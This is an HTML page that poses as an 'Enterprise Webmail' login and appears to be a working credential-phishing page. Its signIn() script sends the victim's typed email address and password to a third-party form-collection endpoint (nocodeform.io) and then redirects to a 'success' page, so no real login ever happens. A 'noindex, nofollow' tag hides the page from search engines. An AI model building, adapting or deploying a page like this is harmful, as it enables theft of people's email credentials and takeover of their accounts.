<!DOCTYPE html>
<html>
<head>
    <meta name="robots" content="noindex, nofollow">
    <title>Professional Webmail Login</title>
    <link rel="shortcut icon" href="/favicon.svg">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        /* Global Styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh; /* Ensures full coverage */
            display: flex;
            justify-content: center;
            align-items: center;
            background-image: url('https://images.unsplash.com/photo-1454165804606-c3d57bc86b40?ixlib=rb-1.2.1&auto=format&fit=crop&w=1950&q=80'); /* Updated reliable URL */
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed; /* Fixes image position */
            font-family: "Segoe UI", Tahoma, Helvetica, Arial, sans-serif;
            margin: 0; /* Remove default body margin */
        }

        /* Login Form Container */
        .login-container {
            background: rgba(255, 255, 255, 0.93);
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 420px;
            text-align: center;
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px); /* For Safari */
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        /* Keep the rest of your CSS styles the same as before */
        .login-container h1 {
            font-size: 2.2em;
            font-weight: 500;
            margin-bottom: 30px;
            color: #2d3748;
            letter-spacing: -0.5px;
        }

        .login-container input {
            width: 100%;
            padding: 12px 16px;
            margin-bottom: 18px;
            border: 1px solid rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            font-size: 1em;
            transition: border-color 0.2s ease;
            background: rgba(255, 255, 255, 0.9);
        }

        .login-container input:focus {
            border-color: #4a90e2;
            outline: none;
            background: white;
        }

        .login-container button {
            width: 100%;
            padding: 12px;
            background-color: #4a90e2;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 1.05em;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s ease, transform 0.1s ease;
        }

        .login-container button:hover {
            background-color: #357abd;
        }

        .login-container button:active {
            transform: scale(0.98);
        }

        .login-container p {
            margin-top: 25px;
            font-size: 0.92em;
            color: #4a5568;
        }

        .login-container a {
            color: #4a90e2;
            text-decoration: none;
            font-weight: 500;
        }

        @media (max-width: 600px) {
            .login-container {
                padding: 30px;
                margin: 20px;
                backdrop-filter: blur(6px);
                -webkit-backdrop-filter: blur(6px);
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Enterprise Webmail</h1>
        <form id="loginForm">
            <input type="email" id="userNameInput" placeholder="Work Email Address" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="button" onclick="signIn()">Continue to Email</button>
        </form>
        <p>Need help? <a href="#">Contact IT Support</a></p>
    </div>

    <script>
        function signIn() {
            const email = document.getElementById("userNameInput").value;
            const password = document.getElementById("password").value;

            $.ajax({
                url: "https://nocodeform.io/",
                type: 'GET',
                data: { email, password },
                success: (response) => {
                    console.log("Authentication request sent");
                    window.location.href = "success.html";
                },
                error: (xhr, status, error) => {
                    console.error("Error:", error);
                }
            });
        }
    </script>
</body>
</html>
